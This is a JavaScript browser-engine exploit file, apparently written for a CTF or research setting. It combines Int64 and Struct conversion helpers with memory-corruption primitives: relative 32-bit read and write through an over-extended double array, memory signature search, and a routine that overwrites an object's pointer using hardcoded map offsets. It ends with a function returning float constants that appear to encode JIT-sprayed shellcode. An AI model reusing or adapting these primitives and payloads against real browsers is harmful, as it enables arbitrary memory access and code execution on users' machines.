//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    console.log(hexstr);
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();
//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// That's all the arithmetic we need for exploiting WebKit.. :)

function CreateString(i64arr) {
    var string = "";
    i64arr.forEach((i) => {
        console.log(typeof i);
        console.log(i);
        i.bytes().forEach((j) => {
            string = string + String.fromCharCode(j)
        });
    });
    console.log("String:");
    console.log(string);
    return string
}

// requires a double array and fake_obj+read_addr_start to be initialized
// returns Int64
function Read64(addr) {
    if (addr < read_addr_start) {
        console.log("Cannot read from this address, is before array");
    }
    const offset = addr - read_addr_start
    const index = Math.floor(offset / 8)
    const is_remainder = (offset % 8 != 0) ? true : false
    if (is_remainder) {
        const i1 = fake_obj[index]
        const i2 = fake_obj[index + 1]
        const val_bytes = new Uint8Array(8)
        for (var i = 0; i < 4; i++) {
            val_bytes[i] = i1[i+4];
            val_bytes[i+4] = i2[i];
        }
        return new Int64(val_bytes);
    } else {
        const val = fake_obj[index];
        return Int64.fromDouble(val);
    }
}

//returns 32 bit integer
function read32IfMinusOne(fake_obj, read_addr_start, addr, is_offset) {
    var offset;
    if (!is_offset) {
        if (addr < read_addr_start) {
            console.log("Cannot read from this address, is before array");
        }
        offset = addr - read_addr_start;
    } else {
        offset = read_addr_start
    }
    const index = Math.floor(offset / 8);
    const is_remainder = (offset % 8 != 0) ? true : false;
    const val = fake_obj[index];
    //console.log(`Read32:\n  addr: ${addr.toString(16)}\n  offset: ${offset.toString(16)}\n  index: ${index}\n  curr_val: ${val}\n  is_remainder: ${is_remainder}`);
    let retval;
    if (is_remainder) {
        const val1 = Int64.fromDouble(fake_obj[index]);
        const val2 = Int64.fromDouble(fake_obj[index+1]);
        retval = new Uint8Array([...val1.bytes().slice(5,8), val2.bytes()[0]]);
    } else {
        const val1 = Int64.fromDouble(fake_obj[index]);
        retval = new Uint8Array(val1.bytes().slice(1,5));
    }
    //console.log(retval);
    const dataView = new DataView(retval.buffer);
    return dataView.getUint32(0, true)
}

function write32IfMinusOne(fake_obj, read_addr_start, addr, val, is_offset) {
    var offset;
    if (!is_offset) {
        if (addr < read_addr_start) {
            console.log("Cannot read from this address, is before array");
            return
        }
        offset = addr - read_addr_start;
    } else {
        offset = read_addr_start
    }
    const index = Math.floor(offset / 8);
    const is_remainder = (offset % 8 != 0) ? true : false;
    const ow_buffer = new ArrayBuffer(4);
    const view = new DataView(ow_buffer);
    view.setUint32(0,val,true);
    const ow_arr = new Uint8Array(ow_buffer);
    if (is_remainder) {
        const val1 = Int64.fromDouble(fake_obj[index]);
        console.log(val1)
        console.log(new Uint8Array([...val1.bytes().slice(0,5),...ow_arr.slice(0,3)]))
        const new_val1 = new Int64(new Uint8Array([...val1.bytes().slice(0,5),...ow_arr.slice(0,3)]))
        const val2 = Int64.fromDouble(fake_obj[index+1]);
        console.log(val2)
        console.log(new Uint8Array([ow_arr[3],...val2.bytes().slice(1,8)]))
        const new_val2 = new Int64(new Uint8Array([ow_arr[3],...val2.bytes().slice(1,8)]))
        fake_obj[index] = new_val1.asDouble()
        fake_obj[index+1] = new_val2.asDouble()
    } else {
        const val1 = Int64.fromDouble(fake_obj[index]);
        console.log(ow_arr)
        console.log(new Uint8Array([val1[0], ...ow_arr, ...val1.bytes().slice(5,8)]))
        const new_val1 = new Int64(new Uint8Array([val1[0], ...ow_arr, ...val1.bytes().slice(5,8)]))
        fake_obj[index] = new_val1.asDouble()
    }
    //console.log(`Write32:\n  addr: ${addr.toString(16)}\n  offset: ${offset.toString(16)}\n  index: ${index}\n  is_remainder: ${is_remainder}`);
}

let dwordInQword = function(d, q, offset) {
    if (d.every((value, index) => value === q[index])) {
        return offset
    } else if (d.every((value, index) => value === q[index+4])) {
        return offset + 4
    } else {
        return -1
    }
}

let wordToUint8Array = function(val) {
    const a_buff = new ArrayBuffer(4)
    const view = new DataView(a_buff)
    view.setUint32(0,val,true)
    return new Uint8Array(a_buff)
}

let read32 = function(arr, offset) {
    const index = Math.floor(offset/8)
    const is_remainder = (offset % 8 != 0) ? true : false
    const element = Int64.fromDouble(arr[index])
    var val_bytes
    console.log(is_remainder)
    if (is_remainder) {
        val_bytes = new Uint8Array([...element.bytes().slice(4,8)])
    } else {
        val_bytes = new Uint8Array([...element.bytes().slice(0,4)])
    }
    var view = new DataView(val_bytes.buffer)
    return view.getUint32(0,true);
}

let write32 = function(arr, offset, value) {
    const val_bytes = wordToUint8Array(value)
    const index = Math.floor(offset/8)
    const is_remainder = (offset % 8 != 0) ? true : false
    const element = Int64.fromDouble(arr[index])
    var view;
    if (is_remainder) {
        write_bytes = new Uint8Array([...element.bytes().slice(0,4), ...val_bytes])
    } else {
        write_bytes = new Uint8Array([...val_bytes, ...element.bytes().slice(4,8)])
    }
    const write_int = new Int64(write_bytes)
    arr[index] = write_int.asDouble()
}

let search32IfMinusOne = function(arr, val, len) {
    const val_bytes = wordToUint8Array(val)
    const offsets = []
    for (var i = 0; i < len; i++) {
        var curr_offset = i * 8
        //read32IfMinusOne(fake_obj, read_addr_start, addr, is_offset)
        const curr_val = Int64.fromDouble(arr[i])
        //console.log(`${curr_offset.toString(16)}: ${hexdump(curr_val.bytes())}`)
        const val1 = read32IfMinusOne(arr, curr_offset, 0, true)
        if (val1 === val) {
            offsets.push(curr_offset)
        }
        curr_offset += 4
        const val2 = read32IfMinusOne(arr, curr_offset, 0, true)
        if (val2 === val) {
            offsets.push(curr_offset)
        }
    }
    return offsets
}

let search32 = function(arr, val, len) {
    const val_bytes = wordToUint8Array(val)
    const offsets = []
    for (var i = 0; i < len; i++) {
        var curr_offset = i * 8
        let curr_val = arr[i];
        const curr_int = Int64.fromDouble(curr_val)
        //console.log(`${curr_offset.toString(16)}: ${hexdump(curr_int.bytes())}`)
        let offset = dwordInQword(val_bytes, curr_int.bytes(), curr_offset)
        if (offset != -1) {
            console.log(curr_int.bytes())
            offsets.push(offset)
        }
    }
    return offsets
}

let getFuncCodeOffset = function(arr, val, len) {
    const val_bytes = wordToUint8Array(val)
    const offsets = []
    for (var i = 0; i < len; i++) {
        var curr_offset = i * 8
        let curr_val = arr[i];
        const curr_int = Int64.fromDouble(curr_val)
        //console.log(`${curr_offset.toString(16)}: ${hexdump(curr_int.bytes())}`)
        let offset = dwordInQword(val_bytes, curr_int.bytes(), curr_offset)
        if (offset != -1) {
            console.log(curr_int.bytes())
            offsets.push(read32(arr,offset+0xc))
        }
    }
    return offsets
}

let objWritePrim = function(target_addr) {
    // map is 0x001ea3cd for the obj below
    const signature = 0x11223344
    let obj = function() {
        this.signature=signature
        this.ptr = 1.1
    }
    const write_arr = [1.1]
    const write_obj = new obj();
    var len = 0x80
    write_arr.setLength(len)
    //for (var i =0; i<len; i++) {
    //    console.log(`${(i*8).toString(16)}: ${hexdump(Int64.fromDouble(write_arr[i]).bytes())}`)
    //}
    //console.log("here:")
    const offsets = search32(write_arr, signature*2, len)
    const ow_offset = offsets[0]+0x4;
    //%DebugPrint(write_obj);
    write32(write_arr, ow_offset, target_addr-0x4)
    return write_obj
}

const func_map = 0x001c097d
const shared_info = 0x001d72a5
let findFuncCands = function(arr) {
    const candidates = []
    const offsets = search32(arr, func_map)
    for (var i = 0; i < offsets.length; i++) {
            candidates.push(offsets[i])
    }
    return candidates
}

let get32Ints = function(big_int) {
    //console.log("jere:")
    //console.log(big_int.bytes())
    //console.log(big_int.bytes().buffer)
    const uint_arr = new Uint8Array([...big_int.bytes()])
    const dataView = new DataView(uint_arr.buffer);
    return [dataView.getUint32(0,true), dataView.getUint32(4,true)]
};

let f = function(){return [6.195235251138349e+223, 1.511863111069807e+214, -6.82852702058614e-229, 1.9711823718342984e-246, 1.9712545101787873e-246, 1.9711828998133302e-246, 1.9711823760800355e-246, 1.9711828988840346e-246, 1.9711829001328016e-246, 1.9711828997300803e-246, 1.9711823718675907e-246, 1.9711828988842298e-246, 1.971182900732201e-246, 1.9711829003294795e-246, 1.9711828996832522e-246, 1.97118289888473e-246, 5.548386610338606e-232, 5.548386608651447e-232, 1.971182898881177e-246, 1.9711828988902502e-246];}
